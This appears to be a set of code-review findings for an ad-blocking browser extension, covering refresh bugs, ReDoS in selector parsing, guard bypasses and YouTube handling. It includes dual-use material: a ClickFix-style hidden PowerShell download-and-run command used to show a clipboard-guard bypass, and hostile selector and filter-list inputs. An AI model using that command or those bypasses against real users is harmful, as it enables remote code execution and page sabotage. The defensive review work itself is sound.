confirmed.title: Turning the filter-lists switch off and on leaves no refreshed list rules, because dynamicLooksActive counts threat rule ids as list rules
confirmed.description: dynamicLooksActive() treats any dynamic rule with an id in [LIST_RULE_ID_BASE=100000, KEPT_RULE_ID_BASE=800000) as proof that the refreshed list rules are installed. The refreshed threat rules use ids 600000-609999 (THREAT_RULE_ID_BASE/END), which fall inside that range. applyEnabled(false) removes only isOurRule() ids (list rules and kept rules) and does not touch the threat rules or state.dynamicActive. When the lists are switched on again, applyEnabled(true) (line 1238) sees dynamicActive=true, finds the threat rules, decides that the dynamic set is active, enables only the static ruleset and returns mode "dynamic" without calling swap(). The refreshed list rules are not rebuilt. refresh() does not repair this either: changed = !state.dynamicActive || retired || stale is false, so every run whose lists are not due, or whose servers answer 304, returns "unchanged" without a swap. This includes a manual "Update lists" click, because it sends conditional requests. The popup and settings status still say "Lists updated (N domains)".
confirmed.failure_scenario: The threat tier is on (default), and one refresh has installed refreshed list rules and refreshed threat rules (normal state). On the settings page the user switches "Block ads and trackers (filter lists)" off and then on. syncFromSettings changes only generalEnabled; threatOn does not change, so the threat rules stay. applyGeneralState -> applyEnabled(true) returns {mode:"dynamic"} with 0 list rules. Only the packed static ruleset blocks after that. Domains added upstream since the pack, and the refreshed copies, are lost until some list answers 200 with changed content, which can take days (Expires: up to 4 days, and servers return 304). The master switch can cause the same result when the threat rebuild section runs before applyGeneralState in the DNR queue. That ordering was not proven.

      return existing.some((r) => r.id >= LIST_RULE_ID_BASE && r.id < KEPT_RULE_ID_BASE);
lines 31-32: THREAT_RULE_ID_BASE = 600000; THREAT_RULE_ID_END = 610000 (inside the range)
lines 1221-1227: applyEnabled(false) removes only isOurRule ids and leaves dynamicActive=true

line 853: let changed = !state.dynamicActive || retired.length > 0 || stale.length > 0;

Reproduction: docs/review-2026-11-16/repros/toggle_threat_test.js (run with: deno test --no-lock --allow-read docs/review-2026-11-16/repros/toggle_threat_test.js). It loads the real update.js with compile.js and the real bundled rules. Output:

  after off: list+kept 0
  after on: {"ok":true,"mode":"dynamic"} list+kept rules 0
  next auto refresh: {"ok":true,"ran":true,"reason":"unchanged"} list+kept rules 0
  manual Update lists (server 304): {"ok":true,"ran":true,"reason":"unchanged"} list+kept rules 0
  error: expected 2355 list rules after on, got 0
The existing test test/list-refresh.test.js:104 ("toggling off/on works") does not catch this, because it does not load src/threat/compile.js and therefore has no threat rules.
confirmed.suggested_fix: In dynamicLooksActive, count only list ids: r.id >= LIST_RULE_ID_BASE && r.id < KEPT_RULE_ID_BASE && !isThreatRule(r.id). A stricter check also compares the count with state.ruleCount. Also consider setting dynamicActive:false in applyEnabled(false), or having refresh() treat "dynamicActive but no list rules installed" as changed, so that a lost dynamic set is rebuilt on the next run. Add a regression test that loads compile.js (with threat rules present) and toggles applyEnabled false/true.

verdict.reason: Confirmed by reading the code. I could not run the repro, because the Bash tool gave no verdict in this session. update.js:31-32 set THREAT_RULE_ID_BASE=600000 and THREAT_RULE_ID_END=610000. These ids are inside [LIST_RULE_ID_BASE=100000, KEPT_RULE_ID_BASE=800000). dynamicLooksActive (update.js:1106) tests only that range, so threat rules alone make it return true. applyEnabled(false) (update.js:1222-1227) removes only isOurRule ids. isOurRule (update.js:513-515) excludes threat ids explicitly, and applyEnabled(false) does not clear state.dynamicActive. syncFromSettings (general-background.js:318-333) touches threat rules only when threatOn changes, so a lists-only toggle keeps them. applyEnabled(true) (update.js:1238-1241) then returns mode 'dynamic' with no list rules and does not call swap(). refresh() line 862 sets changed=false when dynamicActive is true and no list is retired or stale, so 304 or not-due runs do not rebuild. The range test in dynamicLooksActive was not updated to exclude that range, which looks like an oversight. The existing test list-refresh.test.js toggles the switch without threat rules, so it does not cover this case. I did not check git log (Bash was unavailable).
verdict.fix_notes: In update.js dynamicLooksActive, count only list rules: existing.some(r => isOurRule(r.id) && r.id < KEPT_RULE_ID_BASE). Better: require the count of isOurRule rules to be at least state.ruleCount (or > 0 and close to it). As a second guard, add dynamicActive:false to a setState in applyEnabled(false), or treat 'dynamicActive but no isOurRule rules installed' as changed=true in refresh() near line 862. Add a regression test to test/list-refresh.test.js that loads src/threat/compile.js (with psl.js and protected-hosts.js). It runs refresh, then applyEnabled(false), then applyEnabled(true), and asserts that the isOurRule rule count is the same as after the refresh and that the threat rules are not changed.

confirmed.title: The retry after a failed refresh comes after about 3.5 hours, not after 30 minutes as documented. After an offline install, the first alarm is always throttled
confirmed.description: shouldRun() blocks an automatic run when less than RETRY_MIN_MS (30 min) has passed since lastAttemptAt. The only automatic trigger is the gecko-refresh alarm. It first fires 5-30 min after it is created and then every ALARM_PERIOD_MINUTES = 180 min. No code schedules a retry 30 minutes after a failure. On a fresh install, onInstalled runs refreshLists(true), which writes lastAttemptAt=T0. If that run fails (offline or captive portal), the first alarm comes at T0+5..30 min. That is always less than 30 min after T0, so shouldRun returns false. The next alarm is 180 min later. The CHANGELOG 0.3.5 entry ("the retry comes after 30 minutes instead of 12 hours") and the comments at update.js:4 and :621 describe behavior that never occurs. The first real retry comes about 3-3.5 h after the failure, and every later retry comes 3 h after the one before it.
confirmed.failure_scenario: The user installs the extension while the network is down, or behind a captive portal. The install-time refresh fails. The network comes back 1 minute later. The alarm at +5..30 min is throttled. Lists stay on the packed set until the alarm at about +3.5 h, or until the user clicks Update lists. After any other failed automatic refresh, the next attempt is 3 h later, not 30 min later.
confirmed.evidence:
src/general/update.js:19 ALARM_PERIOD_MINUTES = 180; :21 RETRY_MIN_MS = 30*60*1000; :624-630 shouldRun.
src/general-background.js:930 delayInMinutes: 5 + Math.random() * 25; no other timer or alarm calls refreshLists after a failure.
CHANGELOG.md:37 "the retry comes after 30 minutes instead of 12 hours".
Reproduction: docs/review-2026-11-16/repros/throttle_test.js. Output:
  alarm at +5 min -> false
  alarm at +15 min -> false
  alarm at +29 min -> false
  ALARM_PERIOD_MINUTES 180 -> next alarm +209 min: true
confirmed.suggested_fix: After a failed run (result.ok false and ran true), schedule a one-shot alarm (for example "gecko-refresh-retry", delayInMinutes: 30) that calls refreshLists(false). Alternatively, recreate gecko-refresh with delayInMinutes 30 after a failure. Then the documented 30-minute retry happens. Otherwise, correct the CHANGELOG and the comments.

verdict.reason: Confirmed by reading the code. I did not run the repro. shouldRun (update.js:624-630) blocks automatic runs for RETRY_MIN_MS=30 min after lastAttemptAt. refresh() writes lastAttemptAt at line 850 for every run, manual runs included. The only automatic trigger is the gecko-refresh alarm (general-background.js:931). Its first fire comes 5-30 min after creation, and it then repeats every 180 min. No code schedules a retry after a failure. On install, the alarm is created at top level (line 966) and in onInstalled (line 977) before refreshLists(true) runs at T0 (line 990). The first alarm therefore always comes less than 30 min after T0 and is throttled. In practice the retry comes about 3 h after a failure, not 30 min. Impact: after an offline install, the packed lists (and later the stale lists) stay about 3 h longer than the documentation says. Protection stays on the packed floor, and a manual Update lists click still works.
verdict.why_it_may_be_intentional: test/storage-alarm.test.js:110-111 asserts 'next 3 h alarm retries' and 'not hammered right away'. So the tests treat the 30-min value as a floor, and the real retry cadence is the next 3-h alarm. The 0.3.x CHANGELOG (line 202) and the 0.3.5 CHANGELOG (line 37) and the comments at update.js:4 and :621 say 'retry after 30 minutes', which does not match. The main problem is wrong documentation, together with the install edge case, where the first alarm can never pass the throttle.
verdict.fix_notes: Option A (behavior): in general-background.js refreshLists(false or true), when the result is ran:true and ok:false, create a one-shot alarm 'gecko-refresh-retry' with delayInMinutes: 31. Handle it in the onAlarm listener (line 959) with refreshLists(false). Add a test that a failed run schedules the retry alarm and that a run at lastAttemptAt+31 min passes shouldRun. Option B (docs only): change CHANGELOG.md line 37, the comments at update.js:3-4 and :620-621, and the M-2 comment at :842-844 to say that the retry comes on the next 3-hour alarm, at least 30 minutes after the failed attempt.

confirmed.title: A lastRunAt or lastAttemptAt time in the future (clock was once set ahead) stops automatic list refreshes until the clock reaches that time
confirmed.description: shouldRun() computes now - lastRunAt < MIN_INTERVAL_MS and now - lastAttemptAt < RETRY_MIN_MS with no check for negative values. listDue() uses now - meta.fetchedAt >= expiresMs in the same way. If the system clock was ahead when a refresh ran (a wrong CMOS or RTC clock, a VM snapshot, a time zone or NTP error), the stored timestamps are in the future after the clock is corrected. The difference is then negative, so it is always less than the interval, and every automatic refresh is throttled until real time reaches the stored time. That can take months. The same applies to threatHeldAt (now > st.threatHeldAt). Only a manual Update lists click recovers, because manual bypasses shouldRun and listDue.
confirmed.failure_scenario: The PC boots with its clock one year ahead. The 3-hour alarm runs a refresh and stores lastRunAt for 2027-11-16 and fetchedAt for each list. NTP corrects the clock to 2026-11-16. Every later alarm returns {ran:false, reason:"throttled"} for 365 days. The filter lists and threat hosts never auto-update, and the popup keeps the old "Lists updated" text.
confirmed.suggested_fix: Treat a stored time later than now (plus a small skew, for example 5 min) as invalid: in shouldRun and listDue, if last > now or attempt > now or fetchedAt > now, consider the item due. Optionally clamp these values to now when the state is read.

verdict.reason: Confirmed by reading the code. I did not run the repro. shouldRun (update.js:626-629) and listDue (update.js:637) compute now minus a stored time and do not check for a time in the future. A negative difference is always less than the interval, so a lastRunAt or fetchedAt stored while the clock was far ahead throttles automatic refresh until real time passes that stored time. Small clock errors (minutes or hours) only delay a refresh by about that much, so the impact matters only for large errors (days to months), which are rare. A manual Update lists click recovers, because manual bypasses shouldRun and listDue (lines 625 and 636). The packed static ruleset keeps blocking during the stall. The threatHeldAt check (line 593, now > threatHeldAt) only delays confirming a held threat jump, which has a smaller impact.
verdict.why_it_may_be_intentional: No comment, CHANGELOG or TODO entry about clock skew found. The code appears to assume a monotonic wall clock. I did not check git log (Bash was unavailable).
verdict.fix_notes: In update.js shouldRun, treat last > now + 5 min and attempt > now + 5 min as invalid (as 0). In listDue, return true when meta.fetchedAt > now + 5 min. Optionally, when refresh() reads state, clamp lastRunAt, lastAttemptAt and each list's fetchedAt to now when they are in the future. Add unit tests to test/storage-alarm.test.js: shouldRun({lastRunAt: now + 365 days}, now, false) === true, and listDue({fetchedAt: now + 365 days, expiresMs: 4 days}, now, false, true) === true.

confirmed.title: Nested :is()/:where() in a generic hide rule makes the parser take exponential time (worker hang)
confirmed.description: reduceSelector() calls itself two times for each :is/:where/:matches/:-webkit-any/:-moz-any level. First it calls reduceSelector on each argument branch (line 148, the scope check). Then it calls reduceSelector on the same arguments again (line 149). Thus the time is T(d) = 2*T(d-1), which is 2^depth. isUnscopedBranch() also calls reduceSelector two times (lines 159 and 166). sanitizeSelector() accepts nesting up to the 600-character limit (about 118 levels). parseCosmetic() calls isUnscopedSelector() for every generic hide rule, before checkListChange() can reject the list.
confirmed.failure_scenario: EasyList, EasyPrivacy or one of their mirrors (secure.fanboy.co.nz, easylist-downloads.adblockplus.org, ublockorigin.github.io) contains one generic line such as `##:is(:is(:is(...(.a)...)))` with 30 or more levels. This can be a typo, a bad generator or a hostile mirror. update.js refresh() line 921 calls CP.parseCosmetic(text) in the service worker. The call does not end in a practical time: depth 24 takes 14 s, depth 30 takes about 15 minutes, depth 118 never ends. The worker thread is blocked, so the popup, the list swap and the threat rules all stop. The 3-hour alarm starts the same parse again. scripts/pack-cosmetic.mjs line 59 also hangs on the same input.
confirmed.evidence: Repro: docs/review-2026-11-16/repros/redos.mjs (deno run --allow-read). Output: depth 10 = 6 ms, 16 = 62 ms, 18 = 220 ms, 20 = 920 ms, 22 = 3394 ms, 24 = 14190 ms (122 characters). It also shows that a depth-118 selector (592 characters) passes sanitizeSelector unchanged. Code: line 148 `const ok = splitTop(args, ...).every((b) => isScopedText(reduceSelector(b, false)));` and line 149 `if (ok) out += "(" + reduceSelector(args, forSubject) + ")";`. Checked in this session: the timings above, with Deno at /opt/node22/bin/deno. Not checked: the behaviour in a real Chrome service worker.
confirmed.suggested_fix: Calculate each argument branch one time only. Keep the reduced text of each branch, use it for the scope check and also to build the output. Or memoize reduceSelector by (text, forSubject). Also set a limit on parenthesis depth in sanitizeSelector (for example 8 levels) and reject deeper selectors. Add a test with a 118-level :is() chain that must finish in less than 100 ms.

verdict.reason: Confirmed by code reading (src/general/cosmetic-parse.js:129-155). For each :is/:where/:matches/:-webkit-any/:-moz-any level, reduceSelector calls itself on every argument branch (line 148) and then again on the whole argument text (line 149). With one argument per level, T(d) = 2*T(d-1), so the cost is O(2^depth). isUnscopedBranch (lines 159 and 166) doubles it again. sanitizeSelector (lines 23-53) checks only paren balance and the 600-character limit, so about 118 levels pass. parseCosmetic calls isUnscopedSelector (line 281) for every generic hide rule. update.js:921 runs parseCosmetic before checkListChange (line 925), so the list-change guard cannot stop it. NOT CHECKED in this session: the timings. The Bash tool had no classifier verdict, so I could not run the reporter's repro (docs/review-2026-11-16/repros/redos.mjs) or my own. The reporter's figures match the 2^d analysis. Severity re-rated from high to medium: the impact is severe (a stuck service worker, and the parse starts again on each alarm), but the trigger needs a deep :is() chain in a fetched EasyList or EasyPrivacy, which comes over HTTPS from the list hosts. That is unlikely, but the cost of the fix is small.
verdict.why_it_may_be_intentional: Nothing found. The comment at lines 60-65 and CHANGELOG 0.3.5 line 48 describe the scope rules for :is() arguments. Nothing mentions cost or a depth limit. The double call looks like an accident of the design (one call for the check, one for the output), not a deliberate choice.
verdict.fix_notes: In reduceSelector's LIST_PSEUDO_RE branch, reduce each top-level branch only once: const parts = splitTop(args, c => c === ',').map(b => reduceSelector(b, forSubject)); for the scope check, use reduceSelector(b, false) only when forSubject is true, or memoize reduceSelector with a Map keyed by forSubject + '\0' + text for each isUnscopedSelector call. Make isUnscopedBranch compute reduceSelector(m,false) once. Also add a nesting-depth limit (for example 8 to 10) to sanitizeSelector and reject deeper selectors. Add a test in test/ (cosmetic parse tests): parseCosmetic('##' + ':is('.repeat(118) + '.a' + ')'.repeat(118)) must finish in less than 100 ms, and the selector must be rejected or kept as the depth limit specifies. Increase PARSER_VERSION only if the output changes for selectors that are kept.

confirmed.title: EasyList $generichide exceptions are ignored: all generic hide rules apply on Gmail, Docs, GitHub, Slack, ad-manager sites and localhost
confirmed.description: parseCosmetic() reads only `##`, `#@#`, `#?#` and `#@?#` lines. No code in src/ or scripts/ reads the `@@...$generichide` network exceptions. A grep for generichide finds only the comment at cosmetic-parse.js:220, which uses this gap as the reason to make AdGuard 'sites only'. The same gap is also present for EasyList, which is a full cosmetic source (`cosmetic: true`). Today's EasyList has 167 `$generichide` exceptions. They include `@@||mail.google.com^$generichide`, docs/drive/calendar/meet.google.com, github.com, github.io, gitlab.com, slack.com, discord.com, teams.microsoft.com, notion.so, figma.com, chatgpt.com, claude.ai, reddit.com, x.com, facebook.com, adsmanager.facebook.com, ads.microsoft.com, the amazon.* sites, wikipedia.org, `@@://localhost/$generichide`, `@@://192.168.$generichide`, and `@@$generichide,domain=howtogeek.com|screenrant.com|...`. The list also has a section `! Site Specific filters (used with $generichide)`, so EasyList expects these pages to get no generic sheet. The bundled sheet from scripts/pack-cosmetic.mjs has the same gap.
confirmed.failure_scenario: The user opens mail.google.com, github.com, adsmanager.facebook.com, or a router page on 192.168.x.x. The content script (src/cosmetic.js line 160) puts the full generic sheet (13,633 to 13,640 selectors) into the top frame. EasyList's authors exempted these pages because generic ad selectors match real UI parts there (for example ad previews in ad managers) and because of the cost on large web apps. Parts of the page that are not ads are hidden, and every page load of the web app parses about 13.6k extra rules.
confirmed.evidence: Repro: docs/review-2026-11-16/repros/generichide.mjs. With the input `##.ad-banner`, `@@||mail.google.com^$generichide` and `@@||github.com^$generichide`, buildPageCss returns `.ad-banner{display:none!important}` for mail.google.com, github.com and example.com. With today's EasyList (downloaded into docs/review-2026-11-16/repros/lists/easylist.txt), the rule counts are: mail.google.com 13640, github.com 13633, docs.google.com 13637, claude.ai 13633, adsmanager.facebook.com 13639. EasyList lines 76541 (`@@||adsmanager.facebook.com^$generichide`), 76596 (github.com) and 76605 (mail.google.com), and line 74224 `! Site Specific filters (used with $generichide)`. Checked in this session: the parse output and the list contents. Not checked: a live page that shows a wrongly hidden element.
confirmed.suggested_fix: In parseCosmetic, collect the hosts of `@@||host^$generichide` (also `$ghide`, `$elemhide`, `$ehide`) and of `@@$generichide,domain=a|b`. Store them, for example under a new storage key `cosNoG:<host>`. keysForHost and buildPageCss must then leave out the generic sheet when a candidate host is listed (`$elemhide` leaves out the site rules too). Treat `@@://localhost`, `@@://127.0.0.1` and private-IP forms as host prefixes. Apply the same change in scripts/pack-cosmetic.mjs and increase PARSER_VERSION so that stored copies are parsed again.

verdict.reason: Confirmed by grep: no code in src/ or scripts/ reads $generichide, $ghide, $elemhide or $ehide. The only mention is the comment at cosmetic-parse.js:218-221, and that comment uses this same gap as the reason to make AdGuard Base 'sites only'. The same reason applies to EasyList, which is kept as a full generic source. buildPageCss (cosmetic-parse.js:449-465) always adds the full generic sheet (or fallbackGenericCss) for every host. Only #@# exceptions filter it. Thus the generic sheet applies on hosts that EasyList exempts with @@||host^$generichide (mail.google.com, github.com, docs.google.com, adsmanager.facebook.com, and others, as the reporter quotes from EasyList). NOT CHECKED in this session: the reporter's EasyList line numbers and counts. I could not run Bash. NOT CHECKED: a real element that is wrongly hidden on a live page. Severity re-rated from high to medium: no breakage is shown, EasyList generic selectors are mostly safe, and the user can turn the extension off for a site. But this is a real gap from upstream semantics and an extra cost on large web apps.
verdict.why_it_may_be_intentional: cosmetic-parse.js:218-221 says the parser does not support $generichide/$elemhide. For AdGuard, the authors chose to drop generic rules because of this gap. For EasyList they made no such choice, so the gap there seems to be an oversight, not a decision. CHANGELOG and TODO do not list it as known.
verdict.fix_notes: In parseCosmetic, also read network exception lines: @@||host^$generichide (and $ghide), @@||host^$elemhide (and $ehide), @@$generichide,domain=a|b, and @@://localhost / @@://127.0.0.1 / @@://192.168. forms. Return them as noGeneric:[host] and noElem:[host]. Carry them through mergeCosmetic and toStorage, for example as a 'cosNoG:' + host key, and include the key in keysForHost. In buildPageCss, if any candidate host has noGeneric, leave out the generic sheet and fallbackGenericCss. With elemhide, also leave out the site selectors. Make the same change in scripts/pack-cosmetic.mjs and increase PARSER_VERSION. Tests: '##.ad-banner' plus '@@||mail.google.com^$generichide' must give empty CSS for mail.google.com and its subdomains and the full CSS for example.com. '@@$generichide,domain=a.com' must also work. checkCosmeticChange must still accept the list.

confirmed.title: Generic unscoped-selector guard is bypassed by an ancestor :has() with a universal or namespaced subject, or by '&'
confirmed.description: isUnscopedBranch() rejects a '*' subject only when the branch has a single compound (`compounds.length === 1`). It finds html/body only when the type text is exactly 'html' or 'body'. It does not know the nesting selector '&', which Chrome reads as :root at top level, or namespace prefixes ('*|html', '*|body'). The last test (line 166) accepts a branch when there is a class anywhere, also inside an ancestor's :has(). Thus a selector that hides every child of <html>, or <html> itself, is kept as a generic all-sites rule. The comment at lines 64-65 says that a subject html/body/:root/* needs its own class, id or attribute. This is the same contract that test/nightly-cosmetic-2 enforces.
confirmed.failure_scenario: A list (broken, or a hostile mirror) adds the generic line `##html:has(.adsbygoogle) > *`, `##:root:has(.adsbygoogle) > *`, `##&:has(.adsbygoogle)`, `##*|html:has(.adsbygoogle)` or `##*|body:has(.adsbygoogle)`. parseCosmetic keeps it in `generic`. On every site that shows AdSense, the full page (body and head, or html) gets display:none.
confirmed.evidence:
Repro: docs/review-2026-11-16/repros/bypass.mjs (deno) shows that all 6 selectors are kept in parsed.generic. docs/review-2026-11-16/repros/bypasscheck.cjs (node, Playwright with /usr/bin/google-chrome) puts each kept selector on a page `

Article text

`. Result: 'article text visible: false' for &:has(.adsbygoogle), *|html:has(...), *|body:has(...), html:has(...) > *, :root:has(...) > *. Also docs/review-2026-11-16/repros/unscoped.mjs: isUnscopedSelector('html:has(.adsbygoogle) > *') === false. Checked in this session in headless Chrome. Today's EasyList and EasyPrivacy do not contain such lines (checked).
confirmed.suggested_fix: In isUnscopedBranch, remove namespace prefixes (`/^[^|]*\|/`) from the subject type, and treat '&' the same as ':root'. Treat a branch as unscoped when its subject compound has no own class, id or attribute and any compound on its left is html, body, :root, '&' or '*' with only :has()/:is() scoping, or when the subject is '*' or a bare type. Stated more simply, require the subject compound itself to be scoped when the branch starts at html, :root or '&'. Add the 6 selectors above to test/nightly-cosmetic-2.

verdict.reason: Confirmed by tracing the code (cosmetic-parse.js:157-167). For 'html:has(.adsbygoogle) > *', reduceSelector(m, true) drops the :has() arguments, so the result is 'html:has > *'. The compounds are ['html:has', '*'] and the subject is '*'. The '*' check at line 164 needs compounds.length === 1, so it does not reject the branch. Line 166 then finds '.adsbygoogle' in reduceSelector(m, false) and keeps the rule. For '&:has(.x)', the type is '&' and for '*|html:has(.x)' the type is '*|html'. Neither matches 'html'/'body' at line 163, so the class inside :has() lets them through. This defeats the documented contract at lines 64-65 (subject html/body/:root/* needs its own class/id/attribute; 'body:has(.x)' is rejected, but the same effect with 'html:has(.x) > *' is kept). NOT CHECKED in this session: the reporter's deno and Chrome repros. I could not run Bash. The Chrome behaviour of '&' at top level and of '*|html' is from the reporter only. Severity re-rated from medium to low: today's lists do not contain such lines (reporter checked), and the guard is a defence against broken or poisoned lists, which are already rare.
verdict.why_it_may_be_intentional: The compounds.length === 1 limit is on purpose: 'div *' style descendants of a scoped ancestor ('.ad *') must be kept. But the comment at lines 55-65 and CHANGELOG 0.3.5 line 48 show that the goal is to block generic rules that hide the whole page. No comment covers '&', namespace prefixes, or a '*' subject under an html/:root ancestor, so the gap is an oversight.
verdict.fix_notes: In isUnscopedBranch: remove a namespace prefix from each compound type (replace /^[^|]*\|/ with ''), and treat '&' as ':root'. When the subject has no own . # [ and no custom element and its type is '' or '*', walk the compounds on the left. If every compound on its left is html, body, :root, '&' or '*' with scope only from :has()/:is() arguments, return true. Simpler: if the first compound (the reduced form, without :has args) is html, :root or '&', require that a compound after it has its own scope. confirmed.title: Gentle watchdog reloads watch pages that are not meant to play (upcoming live/premiere, playability errors)
confirmed.description: In the shipped configuration (uBO present), armStall runs on every yt-navigate-finish to /watch (line 2200). checkStall then calls loadVideoById(id, 0) once after 15 s of no progress. It pauses only for ad-showing/ad-interrupting, a hidden tab, or a user pause (getPlayerState()===2) (line 1448). It does not check playabilityStatus, the player error state, or an offline/upcoming slate. A scheduled live stream or premiere waiting room, an age-gate or 'Sign in to confirm you're not a bot' page, or a 'Video unavailable' error looks the same as a stall: state -1/unstarted, readyState < 2, currentTime 0. The video gets one unasked reload and one extra /player request each time the page is opened. On the bot-check page this extra request goes to an endpoint that is already throttling the user.
confirmed.failure_scenario: The user opens the watch page of a premiere that starts in 2 hours (or a members-only / unavailable video) and stays on it. At about 15-19 s the watchdog logs 'start stalled at 0:00, reloading the video (1/1)' and calls player.loadVideoById(id, 0). The player and slate reset and /player is fetched again. This repeats on every visit or SPA navigation to such a page.
confirmed.evidence: The project's own clock fixture models this player state (className 'unstarted-mode', getPlayerState -1, readyState 1, no media): `SCENARIO=no-reply deno run -A test/fixtures/youtube-clock-run.mjs` gives {"reloads":[18850], ... "YouTube start stalled at 0:00, reloading the video (1/1)"}. checkStall hold conditions (line 1448-1455) contain no check for an error, upcoming or offline state. Not checked live: which exact player state YouTube reports on an upcoming premiere.
confirmed.suggested_fix: Before reloadVideo, skip (stopStall) when the player shows an error or a non-playable state. Examples: `#movie_player > .ytp-error` is present (the flash guard already tracks this), the player has an offline/upcoming slate (.ytp-offline-slate), or player.getPlayerResponse?.().playabilityStatus.status !== 'OK' (or the status is LIVE_STREAM_OFFLINE / LOGIN_REQUIRED / UNPLAYABLE / ERROR). Add a clock-fixture scenario for each.

verdict.reason: Confirmed by reading the code. Under uBO, every yt-navigate-finish to /watch arms the watchdog (youtube.js:2200). checkStall (youtube.js:1423-1507) holds only for ad-showing/ad-interrupting, a hidden tab, a user pause, or failover grace (lines 1448-1457). playerMoving (youtube.js:1386-1395) checks only currentTime, readyState and state 1. Nothing checks playabilityStatus, an offline/upcoming slate or a permanent error. So a premiere waiting room or an unplayable video, where the player stays at currentTime 0 and readyState below 2, gets one loadVideoById after the gentle wait. Under uBO this happens at most once per navigation (line 1472). The clock fixture result is consistent with this. The impact is one player reset and one extra /player request on each visit to such a page. That is a nuisance, not lost playback, so I lowered the severity to low. Not checked live: the exact player state that YouTube shows on an upcoming premiere or on a LOGIN_REQUIRED page.
verdict.why_it_may_be_intentional: The watchdog exists to recover black-spinner starts. Under uBO it is limited on purpose to one reload and a 15 s or longer gentle wait (CHANGELOG, comments at youtube.js:1462-1474). The .ytp-error overlay is EXPECTED to show for a short time on decoy starts (comment at youtube.js:522-526, createErrorFlashGuard), and the watchdog is supposed to recover those starts. So a blanket '.ytp-error present -> stop' check, as the finding proposes, would conflict with that design. I found no comment that says reloading upcoming or unplayable pages is wanted.
verdict.fix_notes: In checkStall, before reloadVideo (around youtube.js:1497), stop when the player reports a non-playable state that does not come from a decoy. Read player.getPlayerResponse?.().playabilityStatus.status inside a try. Call stopStall() when the status is LIVE_STREAM_OFFLINE, LOGIN_REQUIRED, UNPLAYABLE, ERROR or AGE_CHECK_REQUIRED, or when playabilityStatus.liveStreamability.liveStreamabilityRenderer.offlineSlate exists, or when player.querySelector('.ytp-offline-slate:not([style*="display: none"])') is visible. Do NOT use .ytp-error alone, because decoy starts show it for a short time. Add clock-fixture scenarios in test/fixtures/youtube-clock-run.mjs with getPlayerResponse returning each status, and assert reloads=[]. Keep the existing no-reply scenario (status OK) at one reload.

confirmed.title: Under uBO, the redundant DOM removal puts a 'Blocking ads' element into YouTube's player that the page can read
confirmed.description:
With the uBO layer present, cosmeticSweep() still runs removeDomAds() on each yt-navigate-finish (line 2202). It node.remove()s elements such as `ytd-watch-flexy ytd-ad-slot-renderer`, which src/youtube-ads.css already hides (`ytd-ad-slot-renderer { display:none }`). Every successful removal calls notify(true), which appends
Blocking ads
into #movie_player for 8 s. Elsewhere the project uses neutral ids so the page cannot spot the extension, and with the uBO layer the hooks stand down for the same reason. This element is a plain-text ad-blocker signal inside the player DOM that YouTube's own scripts can query. It is also misleading: under uBO it appears only when a sidebar ad slot already has rendered children at navigation time. It does not appear when uBO actually prunes the player ads.
confirmed.failure_scenario: An SPA navigation to a watch page has a rendered sidebar ytd-ad-slot-renderer at yt-navigate-finish. youtube.js removes it, which the CSS made unnecessary, and inserts #gk-n1 'Blocking ads' into #movie_player. A page check such as `document.querySelector('#movie_player > #gk-n1')` or a MutationObserver on the player sees a foreign child that names ad blocking.
confirmed.evidence:
Repro docs/review-2026-11-16/repros/notice-ubo.mjs (uBO bundle first, then youtube.js, one yt-navigate-finish) prints:
sidebar ad node removed: true
appended into #movie_player: [{"id":"gk-n1","text":"Blocking ads"}]
The chip itself is a documented feature (CHANGELOG 0.2.x). The finding is that under uBO it comes only from redundant DOM removal.
confirmed.suggested_fix: When uboLayerPresent(), skip removeDomAds() in cosmeticSweep (the manifest CSS covers the same selectors), or at least do not call notify(true) from DOM removal. If a user-visible chip is wanted, render it outside the page DOM (for example a closed shadow root on a neutral host outside #movie_player).

verdict.reason: Partly confirmed. I ran docs/review-2026-11-16/repros/notice-ubo.mjs with --location, and it printed that the sidebar node was removed and #gk-n1 'Blocking ads' was appended into #movie_player. The code path is yt-navigate-finish -> cosmeticSweep -> removeDomAds (youtube.js:1290-1302) -> notify(true) (youtube.js:1247-1288). This goes against docs/how-it-works.md:22, which says that with the uBO layer youtube.js 'does not run its DOM sweep'. Two of the finding's claims are wrong. First, removeDomAds is NOT fully redundant: DOM_AD_SELECTORS (youtube.js:54-66) includes .ytp-ad-overlay-container, .ytp-ad-overlay-slot, ytd-action-companion-ad-renderer, ytd-player-legacy-desktop-watch-ads-renderer and ytd-banner-promo-renderer, and src/youtube-ads.css does not cover these. So the fix the finding proposes, 'skip removeDomAds', would drop some coverage. Second, the chip is a documented user-visible feature with a neutral id. The claim that YouTube detects ad blocking through it is a guess. What is real: the code and the doc disagree, and the chip under uBO does not match what was blocked.
verdict.why_it_may_be_intentional: The 'Blocking ads' chip is a deliberate feature (CHANGELOG line 309: 'A short Blocking ads chip shows once per video'). Page-visible markers use neutral ids on purpose (CHANGELOG line 194), and gk-n1 follows that rule. The yt-navigate-finish sweep may have been kept on purpose so that the selectors the CSS does not cover still get handled without an observer.
verdict.fix_notes: Choose one approach and make the code and docs/how-it-works.md:22 agree. A: Add the uncovered DOM_AD_SELECTORS (player overlay, companion, banner-promo, legacy watch ads) to src/youtube-ads.css as display:none rules. Then, in the yt-navigate-finish handler (youtube.js:2202), skip removeDomAds when uboLayerPresent() is true. B: Keep removeDomAds under uBO, but do not call notify(true) from it when uboLayerPresent() is true. Add a layers-harness test (uBO first) that asserts no #gk-n1 is appended after a yt-navigate-finish with a rendered sidebar ad slot.

confirmed.title: Clipboard guard: a page copy listener can change the selection after the guard checks it, and the browser then copies the command
confirmed.description: onCopy runs as a window capture listener. It reads the selection or the field selection, checks it, and then returns. A page listener that runs later (on document, or in the bubble phase) can still change the selection or setSelectionRange. Chrome builds the clipboard text from the selection after all listeners have run. So the checked text is not the copied text. This works with document.execCommand('copy') from any click, and with the visitor's own Ctrl+C on harmless text. No setData call occurs, so the setData and items.add wrappers do not see it. The execCommand wrapper (line 518-520) also checks only before the event.
confirmed.failure_scenario: The visitor clicks anywhere on a 'verify you are human' page. The click handler selects a harmless paragraph and calls document.execCommand('copy'). A document 'copy' listener then selects an off-screen span that holds `powershell -w hidden ... iex (iwr ...)`. Result: the clipboard holds the PowerShell command, with no notice. The same happens when the visitor selects harmless text and presses Ctrl+C, and with a textarea whose selection the listener moves to the command line (setSelectionRange).
confirmed.evidence:
Repro: docs/review-2026-11-16/repros/guards-lens/t2.mjs (Chrome for Testing 153, headless, unpacked extension loaded, clipboard read back with readText). Output:
`D copy handler swaps selection after guard     COMMAND WRITTEN (bypass)`
`E Ctrl+C on safe text, handler swaps selection COMMAND WRITTEN (bypass)`
`F textarea field: handler moves field selection COMMAND WRITTEN (bypass)`
